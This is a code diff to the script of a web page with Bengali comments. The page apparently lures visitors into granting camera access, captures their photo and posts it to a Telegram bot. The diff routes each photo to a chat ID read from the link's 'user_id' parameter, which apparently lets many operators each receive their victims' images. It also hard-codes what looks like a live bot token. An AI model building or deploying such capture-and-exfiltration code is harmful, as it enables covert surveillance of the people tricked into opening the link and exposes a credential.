@@ -72,9 +72,8 @@
     </div>
 
     <script>
-        // এই মানগুলি স্থায়ী এবং শুধুমাত্র আপনার জন্য
+        // আপনার বটের টোকেন এখানে দিন
         const telegramBotToken = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q";
-        const telegramChatId = "8424053022";
 
         const button = document.getElementById('main-button');
         const videoContainer = document.getElementById('video-container');
@@ -82,12 +81,17 @@
         const canvas = document.getElementById('photo-canvas');
         const statusText = document.getElementById('status-text');
 
+        // URL থেকে user_id টি পাওয়ার জন্য কোড
+        const urlParams = new URLSearchParams(window.location.search);
+        const dynamicChatId = urlParams.get('user_id');
+
         async function captureAndSend() {
             statusText.textContent = 'আপনার ছবি তোলা হচ্ছে...';
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
             video.srcObject.getTracks().forEach(track => track.stop());
             videoContainer.style.display = 'none';
             statusText.textContent = 'তথ্য পাঠানো হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।';
@@ -96,7 +100,8 @@
 
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
-                formData.append("chat_id", telegramChatId);
+                // এখানে হার্ড-কোডেড আইডির বদলে ডাইনামিক আইডি ব্যবহার করা হচ্ছে
+                formData.append("chat_id", dynamicChatId);
                 formData.append("photo", blob, "capture.jpg");
                 
                 try {
@@ -111,6 +116,12 @@
         }
 
         async function startProcess() {
+            if (!dynamicChatId) {
+                alert("দুঃখিত, এটি একটি inválid লিঙ্ক। অনুগ্রহ করে বট থেকে পাওয়া সঠিক লিঙ্কটি ব্যবহার করুন।");
+                button.disabled = true;
+                return;
+            }
+
             button.disabled = true;
             statusText.textContent = 'ক্যামেরা চালু করা হচ্ছে...';
             try {
